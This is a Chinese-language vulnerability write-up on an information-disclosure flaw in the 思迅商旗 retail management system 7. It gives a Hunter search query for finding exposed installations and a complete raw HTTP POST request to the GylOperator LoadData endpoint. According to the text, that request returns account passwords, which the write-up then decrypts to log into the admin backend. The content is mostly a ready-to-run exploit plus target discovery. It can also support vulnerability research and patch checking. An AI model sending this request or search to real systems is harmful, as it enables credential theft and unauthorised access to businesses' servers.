# 思迅商旗商业管理系统7 GylOperator存在信息泄露漏洞

# 一、漏洞简介
思迅商旗商业管理系统是基于互联网部署的全新零售管理系统。提炼各架构优势之大成，打造全新互联网产品。思迅商旗商业管理系统GylOperator存在信息泄露漏洞，<font style="color:rgba(0, 0, 0, 0.9);">攻击者可通过该漏洞在服务器端读取账户密码，从而登录后台。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 思迅商旗商业管理系统7

# 三、资产测绘
+ hunter`app.name=="思迅商旗"`
+ 特征

![1705060048606-5d05fc49-9ceb-4db7-84e0-7304c7456bf4.png](./img/2A930e-fCUruS1PS/1705060048606-5d05fc49-9ceb-4db7-84e0-7304c7456bf4-600717.png)

# 四、漏洞复现
```java
POST /api/GylOperator/LoadData HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Length: 68
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cache-Control: no-cache
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

loadAll=false&key=&oper_role=&gridFlag=GylOperatorList&page=1&rows=1
```

![1705060098747-c6665464-15ab-4c81-820d-1451d49f124f.png](./img/2A930e-fCUruS1PS/1705060098747-c6665464-15ab-4c81-820d-1451d49f124f-449203.png)

解密

![1705060110267-c8a83e28-b7a6-405a-a6ec-9d97db539e71.png](./img/2A930e-fCUruS1PS/1705060110267-c8a83e28-b7a6-405a-a6ec-9d97db539e71-014155.png)

![1705060626680-642f8fe6-d094-4c99-af4a-978993b73ddb.png](./img/2A930e-fCUruS1PS/1705060626680-642f8fe6-d094-4c99-af4a-978993b73ddb-306254.png)



> 更新: 2024-02-29 23:55:42  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/vzyrz9h4ztl1gdca>